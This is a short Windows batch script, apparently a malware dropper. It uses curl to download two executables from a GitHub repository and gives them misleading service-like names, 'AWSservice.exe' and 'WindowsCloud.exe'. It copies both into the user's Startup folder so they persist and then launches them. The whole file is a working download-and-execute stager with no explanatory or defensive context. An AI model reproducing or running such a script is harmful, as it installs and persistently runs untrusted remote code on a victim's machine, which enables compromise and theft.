@echo off
curl -o "%USERPROFILE%\\AWSservice.exe" https://raw.githubusercontent.com/Doppelgangergny/umnovomundo/main/AWSservice.exe
curl -o "%USERPROFILE%\\WindowsCloud.exe" https://raw.githubusercontent.com/Doppelgangergny/umnovomundo/main/HostAppD.exe
copy "%USERPROFILE%\\WindowsCloud.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsCloud.exe"
copy "%USERPROFILE%\\AWSservice.exe" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\AWSservice.exe"
start "" "%USERPROFILE%\\WindowsCloud.exe"
start "" "%USERPROFILE%\\AWSservice.exe"